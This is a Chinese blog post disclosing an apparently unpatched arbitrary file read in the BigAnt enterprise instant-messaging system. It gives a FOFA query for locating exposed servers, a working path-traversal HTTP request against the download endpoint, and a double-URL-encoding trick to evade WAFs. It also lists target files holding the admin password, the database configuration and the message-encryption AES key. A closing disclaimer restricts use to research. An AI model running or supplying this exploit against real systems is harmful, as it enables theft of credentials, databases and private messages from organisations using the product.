#  【0day】大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞  
 0day收割机   2026-02-25 06:36  
  
# 漏洞简介  
  
杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 PublicController download 接口存在任意文件读取/下载漏洞，攻击者可以通过特殊的参数绕过系统限制，读取系统上任意文件内容，造成敏感内容泄露或为进一步攻击做准备。  
# 影响版本  
  
BigAnt 5.5.x 及以上版本用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBUJZOFKLC6Cyq6VJ6B50tmHLjlM9mgqwkjwA0rCGiamYYexichDY4eeVMnxicxbSk2pibsqeD2Qjcoubv3iaaib2qTplgmouFU44Qe0/640?wx_fmt=png&from=appmsg "")  
  
经过测试，最新版本 6.0.1.20250407.1 也受影响  
# fofa语法  
> (body="/Public/static/admin/admin_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"  
  
# 漏洞复现  
> 需要注意thinkphp的路由特性，不区分大小写，且还支持如下等方式  
> /Admin/Public/download.html  
> /Admin/Public/download  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBoMnU9hQxT5gC0m5hnBoj46cSc8YaTaSuxYQAkXXnDq3MIJGnrGVHCGspDxib15hJ9ic1hicEny7q6KcMUSu1V3ro3kPVxicwt2y0/640?wx_fmt=png&from=appmsg "")  
```
GET /?m=Admin&c=Public&a=download&file=%2f%2e%2e%2e%2e%2f%2f%69%6e%73%74%61%6c%6c%2e%63%6d%64&name=README.txt HTTP/1.1
Host:
Cookie: PHPSESSID=xxxxx
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWD4ywdicJ9R5F58tFW6FEVZEct4qk2G2etam8qI6BKDUDibDk6rYWTkEJeeQJdJicrybGlRwGJGf2jYK0Lxr3a0GHttQicKC9nB0iaA/640?wx_fmt=png&from=appmsg "")  
  
成功读取到web根目录上一级目录下的 **install.cmd文件内容。**  
  
因为$file = urldecode($file);  
的存在，我们还可以双重url编码参数file,达到bypass部分垃圾waf.  
  
或者读取其他敏感文件如/Runtime/Data/ms_admin.php  
 它包含当前系统用户admin的密码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWBJ5L0SWXE1uZbtZDVokMJPstVhgEGCONVN0AclkBcwyhwc4GQGYH3ickicEWia7rjmP1oicWcc8JBcd0xicJblunqibDiadd9df2zLY8/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWDGLcpxHPuIfe8iaCIgGvynzMOUbibBteIZ311DoicVZLgL8v6e6Ud56W008saSiaNibNvkOOxKYURia6rh2PJLVbjwwE16OjmR2I2NA/640?wx_fmt=png&from=appmsg "")  
  
或者 installData.php ，包含系统数据库配置信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWBbMZ1bbWKuDjVq3Fic9YbG2eemnX3obPf1uOF0ZV3KMToCibBl3OVCL6xqaokoARScm2ZHiaABYfoUuNhmfQDNOibPduRIGQMk3tU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWDytjyjasEZr2RZQ6juLct7TrJJSqkqZoEBk76jOoibxvnAiaDS2hozkJicN9YEKx0P8lP9j0dOaegia5DWnP2cJ2eJU3cTTC38Ckw/640?wx_fmt=png&from=appmsg "")  
  
或者 msg_encrypt_key.php 包含消息、文件解密aes密钥  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
